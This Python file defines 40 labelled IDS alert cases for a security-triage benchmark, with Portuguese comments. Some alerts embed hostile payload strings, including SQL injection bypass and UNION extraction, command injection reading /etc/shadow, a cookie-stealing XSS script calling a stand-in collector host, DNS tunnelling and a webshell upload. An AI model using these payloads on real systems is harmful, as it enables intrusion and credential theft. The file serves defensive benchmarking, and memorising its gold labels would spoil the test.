"""Casos de telemetria IDS/IPS (intrusão de rede) para o benchmark.

40 alertas: 10 ALTA, 12 MEDIA, 8 BAIXA, 10 FALSO_POSITIVO — 8 marcados como
ambíguos (20%), onde o padrão técnico isolado levaria a um rótulo errado.
"""

from __future__ import annotations


def casos_ids() -> list:
    from gerar_benchmark import Caso

    casos = [
        # --- ALTA (10) ---
        Caso(
            "IDS", "203.0.113.10", "10.0.1.5", 443, "TCP",
            'POST /login HTTP/1.1 | body: username=admin&password=x\' OR \'1\'=\'1\'-- -',
            "SQL injection classica em formulario de login exposto",
            "high", "ALTA", "T1190", 0,
            "payload confirma bypass de autenticacao via SQLi contra servico web publico.",
        ),
        Caso(
            "IDS", "198.51.100.23", "10.0.1.5", 443, "TCP",
            "GET /produtos?id=1 UNION SELECT null,username,password,null FROM usuarios-- HTTP/1.1",
            "SQL injection com UNION SELECT extraindo credenciais",
            "critical", "ALTA", "T1190", 0,
            "extracao direta de tabela de credenciais via UNION SELECT, IP publico externo.",
        ),
        Caso(
            "IDS", "192.0.2.44", "10.0.1.8", 8080, "TCP",
            "GET /cgi-bin/status.cgi?host=127.0.0.1;cat%20/etc/shadow HTTP/1.1",
            "Command injection encadeado para leitura de /etc/shadow",
            "critical", "ALTA", "T1059", 0,
            "injecao de comando com acesso a arquivo de credenciais do sistema.",
        ),
        Caso(
            "IDS", "10.0.2.30", "8.8.8.8", 53, "UDP",
            "Query TXT: 4f6a9c2e...(4096B base64).exfil.attacker-dns.example a cada 4s, 900 queries/h",
            "Tunelamento DNS com volume e frequencia incompativeis com resolucao legitima",
            "high", "ALTA", "T1048", 0,
            "volume e padrao periodico de queries TXT longas caracterizam exfiltracao via DNS.",
        ),
        Caso(
            "IDS", "203.0.113.90", "10.0.1.2", 22, "TCP",
            "sshd[3321]: Failed password for root from 203.0.113.90 port 51422 ssh2 (x210 em 6min)",
            "Brute force SSH contra conta root, 210 tentativas em 6 minutos",
            "high", "ALTA", "T1110", 0,
            "volume elevado de tentativas contra conta privilegiada em janela curta.",
        ),
        Caso(
            "IDS", "10.0.2.15", "203.0.113.200", 443, "TCP",
            "GET /api/v2/check HTTP/1.1 | Host: cdn-assets-static.info | intervalo fixo de 58-62s, 340 reqs/24h",
            "Beaconing C2 com jitter minimo para dominio registrado ha 3 dias",
            "high", "ALTA", "T1071", 0,
            "periodicidade quase perfeita e dominio recem-registrado sao indicadores classicos de C2.",
        ),
        Caso(
            "IDS", "198.51.100.5", "10.0.1.5", 443, "TCP",
            '<script>new Image().src="//evil-collector.io/c.gif?ck="+document.cookie;</script> salvo em campo de comentario persistente',
            "XSS armazenado roubando cookies de sessao de outros usuarios",
            "high", "ALTA", "T1190", 0,
            "XSS persistente com exfiltracao ativa de cookie de sessao para dominio externo.",
        ),
        Caso(
            "IDS", "203.0.113.15", "10.0.1.5", 443, "TCP",
            "POST /uploads/avatar.php HTTP/1.1 | multipart: shell.php.jpg -> renomeado shell.php | depois: GET /uploads/shell.php?cmd=whoami",
            "Upload de webshell via bypass de validacao de extensao seguido de execucao remota",
            "critical", "ALTA", "T1190", 0,
            "sequencia completa de upload de webshell e execucao de comando confirma comprometimento.",
        ),
        Caso(
            "IDS", "192.0.2.99", "10.0.1.9", 8080, "TCP",
            "Content-Type: application/x-java-serialized-object | body: rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==...(gadget chain CommonsCollections)",
            "Deserializacao insegura Java com gadget chain conhecido",
            "critical", "ALTA", "T1190", 0,
            "gadget chain identificado em objeto Java desserializado indica tentativa de RCE.",
        ),
        Caso(
            "IDS", "10.0.4.80", "203.0.113.230", 443, "TCP",
            "PUT /objects/backup-2026-04.tar.gz.enc 2.3GB -> storage.unknown-host-77.ru (fora da lista de destinos aprovados)",
            "Job de backup enviando volume grande para destino externo nao cadastrado",
            "medium", "ALTA", "T1048", 1,
            "backup para destino externo desconhecido nao consta na lista de storages aprovados — ao contrario do job noturno legitimo do golden set, aqui o destino é anomalo, favorecendo exfiltracao disfarcada de rotina.",
        ),
        # --- MEDIA (12) ---
        Caso(
            "IDS", "198.51.100.14", "10.0.1.10", 0, "TCP",
            "SYN 22,80,443,3306,3389,5432,8080,8443,9200,27017 sequencial em 4s a partir do mesmo IP",
            "Port scan sequencial cobrindo 25 portas comuns de servico",
            "medium", "MEDIA", "T1046", 0,
            "varredura sequencial tipica de reconhecimento pre-ataque, sem confirmacao de exploracao.",
        ),
        Caso(
            "IDS", "203.0.113.60", "10.0.1.2", 22, "TCP",
            "sshd[441]: Failed password for admin from 203.0.113.60 port 40112 ssh2 (x12 em 3min)",
            "Multiplas falhas de login SSH, volume moderado",
            "medium", "MEDIA", "T1110", 0,
            "volume moderado de falhas, abaixo do limiar de forca bruta confirmada, requer acompanhamento.",
        ),
        Caso(
            "IDS", "10.0.2.22", "198.51.100.77", 443, "TCP",
            "TLS SNI: promo-cashback-flash.net (dominio registrado ha 2 dias, sem reputacao previa)",
            "Conexao HTTPS de saida para dominio recem-registrado sem historico",
            "medium", "MEDIA", "T1071", 0,
            "dominio novo sem reputacao e indicador fraco isolado, exige investigacao do analista.",
        ),
        Caso(
            "IDS", "192.0.2.33", "10.0.1.5", 80, "TCP",
            "GET /.env HTTP/1.1 | User-Agent: python-requests/2.31.0",
            "Tentativa de acesso a arquivo de configuracao sensivel",
            "medium", "MEDIA", "T1005", 0,
            "tentativa isolada de acessar arquivo sensivel, sem confirmacao de sucesso.",
        ),
        Caso(
            "IDS", "198.51.100.41", "10.0.1.20", 443, "TCP",
            "auth.log: usuario carla.mendes autenticado via VPN de IP geolocalizado em pais distinto do habitual (BR -> exterior), sem viagem registrada",
            "Login com geolocalizacao incomum para o usuario",
            "medium", "MEDIA", "T1078", 0,
            "anomalia geografica isolada sem outros indicadores de comprometimento confirma apenas suspeita.",
        ),
        Caso(
            "IDS", "10.0.2.44", "203.0.113.150", 443, "TCP",
            "PUT /upload 350MB para storage-publico-desconhecido.example, usuario servico-relatorios, fora do horario usual",
            "Volume de upload acima do padrao historico do usuario",
            "medium", "MEDIA", "T1048", 0,
            "volume anomalo isolado, sem confirmacao de conteudo sensivel, requer triagem.",
        ),
        Caso(
            "IDS", "203.0.113.31", "10.0.1.9", 8080, "TCP",
            "GET /api/users/1 ... GET /api/users/500 HTTP/1.1 (sequencial, 500 requisicoes em 90s)",
            "Enumeracao de identificadores de usuario via API",
            "medium", "MEDIA", "T1046", 0,
            "enumeracao sequencial de IDs indica reconhecimento de dados expostos via API.",
        ),
        Caso(
            "IDS", "198.51.100.62", "10.0.1.5", 80, "TCP",
            "GET /admin 404 | GET /backup 404 | GET /.git/config 404 | GET /wp-admin 404 (40 caminhos testados em 20s)",
            "Varredura automatizada de diretorios e caminhos sensiveis",
            "medium", "MEDIA", "T1046", 0,
            "scan de diretorios tipico de ferramenta automatizada de reconhecimento web.",
        ),
        Caso(
            "IDS", "192.0.2.71", "10.0.1.30", 3389, "TCP",
            "RDP handshake de 192.0.2.71 (IP publico, sem correspondencia em lista de VPN corporativa)",
            "Conexao RDP originada de IP publico nao cadastrado",
            "medium", "MEDIA", "T1078", 0,
            "exposicao de RDP a IP externo desconhecido e risco relevante mesmo sem confirmacao de exploracao.",
        ),
        Caso(
            "IDS", "10.0.3.70", "198.51.100.210", 443, "TCP",
            "TLS 1.2 handshake, cifra fraca (TLS_RSA_WITH_RC4_128_SHA), destino sem certificado valido (self-signed)",
            "Conexao de saida usando cifra TLS obsoleta para destino com certificado invalido",
            "medium", "MEDIA", "T1071", 0,
            "combinacao de cifra fraca e certificado invalido sugere possivel canal nao autorizado, exige checagem.",
        ),
        Caso(
            "IDS", "10.0.1.40", "10.0.4.9", 5432, "TCP",
            "usuario app_readonly executou 40 queries DELETE em tabela clientes as 03:12, fora do padrao (role e somente leitura)",
            "Conta de aplicacao com permissao somente leitura executando comandos de escrita",
            "low", "MEDIA", "T1078", 1,
            "conta de servico realizando operacao fora do escopo de sua role configurada e sinal de comprometimento ou erro grave de configuracao — nao deve ser tratado como ruido de rotina.",
        ),
        Caso(
            "IDS", "10.0.2.60", "198.51.100.190", 8443, "TCP",
            "certificado apresentado difere do certificado fixado (pin) esperado para parceiro-pagamentos.example",
            "Falha de certificate pinning em conexao de saida para parceiro de pagamento",
            "medium", "MEDIA", "T1071", 0,
            "quebra de pinning pode indicar interceptacao de trafego (MITM), requer investigacao imediata do analista.",
        ),
        # --- BAIXA (8) ---
        Caso(
            "IDS", "10.0.3.15", "10.0.1.2", 22, "TCP",
            "sshd: Failed password for dev01 (x2), depois Accepted password for dev01",
            "Login falho isolado seguido de sucesso, padrao de digitacao",
            "low", "BAIXA", "T1110", 0,
            "duas falhas seguidas de sucesso e padrao consistente com erro de digitacao do proprio usuario.",
        ),
        Caso(
            "IDS", "10.0.3.22", "10.0.1.15", 443, "TCP",
            "VPN connect: usuario bruno.alves as 22:34, sessao de 40min, acesso a repositorio de codigo",
            "Acesso remoto fora do horario comercial padrao",
            "low", "BAIXA", "T1078", 0,
            "acesso fora de horario sem outros indicadores e anomalia leve, compativel com trabalho remoto legitimo.",
        ),
        Caso(
            "IDS", "10.0.2.5", "10.0.1.1", 0, "ICMP",
            "ICMP echo request/reply continuo, 1 pacote/s, origem e destino ambos internos",
            "Trafego ICMP elevado entre hosts internos",
            "low", "BAIXA", "", 0,
            "ping continuo entre hosts internos e ruido operacional de baixo risco, sem padrao de ataque.",
        ),
        Caso(
            "IDS", "10.0.2.18", "10.0.1.12", 8443, "TCP",
            "TCP handshake completo, sessao HTTPS de 12min, sem payload suspeito identificado",
            "Conexao em porta alta pouco usual para servico interno",
            "low", "BAIXA", "", 0,
            "porta incomum isolada sem payload suspeito e indicio fraco, merece apenas revisao leve.",
        ),
        Caso(
            "IDS", "10.0.2.9", "8.8.8.8", 53, "UDP",
            "Query A: telemetry.raro-fabricante-iot.example (1 consulta, sem repeticao)",
            "Consulta DNS a dominio pouco acessado pela organizacao",
            "low", "BAIXA", "", 0,
            "consulta unica a dominio raro sem repeticao ou volume nao configura padrao de exfiltracao.",
        ),
        Caso(
            "IDS", "203.0.113.140", "10.0.1.5", 80, "TCP",
            "GET / HTTP/1.1 | User-Agent: curl/8.4.0 | sem parametros ou payload adicional",
            "User-agent de linha de comando em endpoint publico",
            "low", "BAIXA", "", 0,
            "requisicao simples com user-agent de ferramenta CLI, sem payload malicioso, e baixo risco.",
        ),
        Caso(
            "IDS", "10.0.3.55", "10.0.1.5", 443, "TCP",
            "GET /status HTTP/1.1 respondido 200 apos timeout intermitente as 04:02 (1 ocorrencia)",
            "Timeout isolado em endpoint de status, sem recorrencia",
            "low", "BAIXA", "", 0,
            "ocorrencia unica de timeout sem recorrencia e provavel instabilidade de rede, nao ataque.",
        ),
        Caso(
            "IDS", "10.0.1.90", "10.0.1.5", 443, "TCP",
            "3 requisicoes 404 para /old-api/v1/status em 10 minutos, endpoint descontinuado ha 1 ano",
            "Requisicoes esporadicas a endpoint de API legado descontinuado",
            "low", "BAIXA", "", 0,
            "volume baixo e endpoint legado conhecido, sem indicio de varredura ou automacao maliciosa.",
        ),
        # --- FALSO_POSITIVO (10) ---
        Caso(
            "IDS", "10.0.4.10", "10.0.1.5", 443, "TCP",
            "Nessus Plugin 51192 executado via job agendado 'scan-mensal-pci', janela 02:00-04:00 aprovada em change request CR-8821",
            "Scanner de vulnerabilidade agendado disparando assinaturas de IDS",
            "medium", "FALSO_POSITIVO", "", 1,
            "atividade de scanner interno agendado e aprovado gera as mesmas assinaturas de um ataque real — o contexto do change request, nao o padrao tecnico, resolve o caso.",
        ),
        Caso(
            "IDS", "10.0.2.50", "10.0.4.20", 445, "TCP",
            "SMB write 2GB para fileserver-backup-interno.corp, job 'backup-noturno-db01', horario padrao 01:00-03:00",
            "Transferencia de backup automatico para storage interno cadastrado",
            "medium", "FALSO_POSITIVO", "", 1,
            "volume de 2GB e a mesma assinatura de exfiltracao volumosa vista em outros casos ALTA deste benchmark — apenas destino e horario, correspondentes ao job de backup documentado, distinguem este caso de uma exfiltracao real.",
        ),
        Caso(
            "IDS", "10.0.1.1", "10.0.1.5", 443, "TCP",
            "GET /health HTTP/1.1 a cada 30s, origem load-balancer-prod-01 (IP cadastrado como healthcheck)",
            "Health check de load balancer em intervalo regular",
            "low", "FALSO_POSITIVO", "", 1,
            "padrao periodico identico a beaconing C2, mas origem e destino sao infraestrutura interna conhecida de healthcheck — o mesmo padrao temporal, de outra origem, seria classificado como ALTA.",
        ),
        Caso(
            "IDS", "10.0.3.30", "0.0.0.0", 443, "TCP",
            "GET /c/msdownload/update/software/... Host: update.microsoft.com (assinatura verificada)",
            "Download de atualizacao do Windows Update",
            "low", "FALSO_POSITIVO", "", 0,
            "dominio e assinatura correspondem a atualizacao oficial da Microsoft, sem risco.",
        ),
        Caso(
            "IDS", "10.0.2.11", "10.0.4.1", 123, "UDP",
            "NTP sync request/response, servidor ntp-interno.corp",
            "Sincronizacao de horario com servidor NTP interno",
            "low", "FALSO_POSITIVO", "", 0,
            "trafego NTP para servidor interno cadastrado e operacao rotineira sem risco.",
        ),
        Caso(
            "IDS", "10.0.4.5", "10.0.4.6", 443, "TCP",
            "Failover simulado entre nos do cluster, execucao referenciada em runbook DR-004, aviso previo enviado ao SOC",
            "Teste de disaster recovery agendado e documentado",
            "medium", "FALSO_POSITIVO", "", 0,
            "atividade documentada em runbook e avisada previamente ao SOC, sem indicio de incidente real.",
        ),
        Caso(
            "IDS", "10.0.5.10", "10.0.1.5", 443, "TCP",
            "POST /login body: usuario=admin' UNION SELECT senha FROM contas-- | origem: 10.0.5.10 (sub-rede da equipe red-team-autorizada)",
            "Payload de SQLi identico a ataque real, originado da rede do red team",
            "high", "FALSO_POSITIVO", "T1190", 1,
            "o payload e tecnicamente identico a um ataque real; somente a origem (sub-rede do pentest autorizado, com escopo aprovado em contrato) permite concluir falso positivo — julgar so pelo payload levaria a ALTA erroneamente.",
        ),
        Caso(
            "IDS", "10.0.4.30", "10.0.1.5", 8080, "TCP",
            "GET /metrics HTTP/1.1 a cada 15s, User-Agent: Prometheus/2.48 (agente cadastrado)",
            "Agente de monitoramento coletando metricas de aplicacao",
            "low", "FALSO_POSITIVO", "", 0,
            "requisicao periodica de agente de APM cadastrado, comportamento esperado de monitoramento.",
        ),
        Caso(
            "IDS", "10.0.3.40", "0.0.0.0", 0, "TCP",
            "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* detectado e colocado em quarentena automaticamente",
            "Deteccao de arquivo de teste EICAR pelo antivirus",
            "medium", "FALSO_POSITIVO", "", 1,
            "assinatura de deteccao classificada como severidade media pela fonte pareceria exigir triagem, mas o conteudo do arquivo corresponde exatamente ao padrao EICAR, teste padrao da industria, nao malware real.",
        ),
        Caso(
            "IDS", "10.0.4.70", "10.0.1.5", 443, "TCP",
            "Trafego identico a assinatura de scan de vulnerabilidade, origem 10.0.4.70 corresponde ao scanner interno OpenVAS, execucao as 02:00 conforme calendario trimestral aprovado",
            "Assinatura de scan disparada por scanner de compliance trimestral",
            "medium", "FALSO_POSITIVO", "", 1,
            "assinatura tecnica indistinguivel de ataque real, mas o calendario aprovado e a origem do scanner corporativo confirmam atividade sancionada.",
        ),
    ]
    assert len(casos) == 40, f"IDS deve ter 40 casos, tem {len(casos)}"
    return casos
